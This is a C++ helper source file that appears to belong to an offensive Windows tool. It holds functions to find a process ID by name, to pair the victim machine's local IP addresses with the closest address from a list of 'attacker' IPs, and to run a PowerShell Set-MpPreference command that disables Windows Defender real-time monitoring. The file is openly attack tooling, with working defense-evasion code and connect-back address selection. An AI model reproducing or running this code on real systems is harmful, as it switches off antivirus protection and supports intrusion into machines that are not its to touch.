#include "helpers.h"


std::uint32_t GetPID(std::string PrcName) {
    PROCESSENTRY32 PrcEntry;
    const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
    if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
        return NULL; // invalid handle
    }
    PrcEntry.dwSize = sizeof(PROCESSENTRY32);  // set size of function process entry (after validating the given handle)
    while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
        std::wstring wideExeFile(PrcEntry.szExeFile);
        std::string narrowExeFile(wideExeFile.begin(), wideExeFile.end());

        if (strcmp(PrcName.c_str(), narrowExeFile.c_str()) == 0) {
            return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
        }
    }
    return NULL;  // if something did not work correctly
}


DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr) {
    DWORD Score = 0;
    DWORD LocalInd = 0;
    DWORD RemoteInd = 0;
    DWORD MaskValue = 0x80;
    DWORD CurrMask = 0x80;
    DWORD MatchingFields = 0;
    DWORD LocalNumeric = 0;
    DWORD RemoteNumeric = 0;

    while (MatchingFields != 4) {
        while (LocalHost[LocalInd] != '.' && LocalHost[LocalInd] != '\0') {
            LocalNumeric *= 10;
            LocalNumeric += (LocalHost[LocalInd] - 0x30);
            LocalInd++;
        }

        while (RemoteAddr[RemoteInd] != '.' && RemoteAddr[RemoteInd] != '\0') {
            RemoteNumeric *= 10;
            RemoteNumeric += (RemoteAddr[RemoteInd] - 0x30);
            RemoteInd++;
        }

        while (CurrMask != 0) {
            if ((RemoteNumeric & CurrMask) == (LocalNumeric & CurrMask)) {
                Score++;
            }
            else {
                return Score;
            }
            CurrMask /= 2;
        }
        RemoteInd++;
        LocalInd++;
        MatchingFields++;
        LocalNumeric = 0;
        RemoteNumeric = 0;
        CurrMask = MaskValue;
    }
    return Score;  // If got here - 32, probably not possible, exactly like current IP address
}


BOOL MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps) {
    char LocalHostName[80];
    char* CurrIp = NULL;
    char CurrAttacker[MAXIPV4_ADDRESS_SIZE] = { 0 };

    struct hostent* LocalIpsList = NULL;
    DWORD CompareScore = 0;
    DWORD CurrentScore = 0;
    DWORD AddrIndex = 0;
    DWORD AttackIndex = 0;
    WSADATA SockData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &SockData) != 0) {
        return FALSE;
    }


    // Get the hostname of the local machine to get ip addresses -
    if (gethostname(LocalHostName, sizeof(LocalHostName)) == SOCKET_ERROR) {
        printf("%d when getting local host name!", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    LocalIpsList = gethostbyname(LocalHostName);
    if (LocalIpsList == 0) {
        WSACleanup();
        return FALSE;
    }


    // Find the address pair with the most similar bits in the address -
    while (AddrIndex < strlen(AttackerIps)) {
        while (AttackerIps[AddrIndex] != '~' && AttackerIps[AddrIndex] != '\0') {
            CurrAttacker[AttackIndex] = AttackerIps[AddrIndex];
            AddrIndex++;
            AttackIndex++;
        }
        CurrAttacker[AttackIndex] = '\0';
        AttackIndex = 0;
        if (AttackerIps[AddrIndex] == '~') {
            AddrIndex++;
        }

        for (int i = 0; LocalIpsList->h_addr_list[i] != 0; ++i) {
            struct in_addr addr;
            memcpy(&addr, LocalIpsList->h_addr_list[i], sizeof(struct in_addr));
            CurrIp = inet_ntoa(addr);
            CurrentScore = CompareIpAddresses(CurrIp, CurrAttacker);
            if (CurrentScore > CompareScore) {
                CompareScore = CurrentScore;
                RtlZeroMemory(TargetAddress, MAXIPV4_ADDRESS_SIZE);
                RtlZeroMemory(AttackerAddress, MAXIPV4_ADDRESS_SIZE);
                memcpy(TargetAddress, CurrIp, strlen(CurrIp) + 1);
                memcpy(AttackerAddress, CurrAttacker, strlen(CurrAttacker) + 1);
            }
        }
    }

    WSACleanup();
    return TRUE;
}


BOOL GetAddresses(char* Target, char* Attacker, const char* AttackAddresses) {
    if (!MatchIpAddresses(Target, Attacker, AttackAddresses)) {
        printf("[-] Cannot find the target address and the matching attacker address!\n");
        return FALSE;
    }
    printf("Target: %s, Attacker: %s\n", Target, Attacker);
    return TRUE;
}


RETURN_LAST RealTime(BOOL IsDisable) {
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\"";
    if (IsDisable) {
        LastError.LastError = system(Disable);
    }
    else {
        LastError.LastError = system(Enable);
    }

    if (LastError.LastError == -1) {
        LastError.LastError = GetLastError();
        LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
        return LastError;
    }
    LastError.LastError = 0;
    return LastError;
}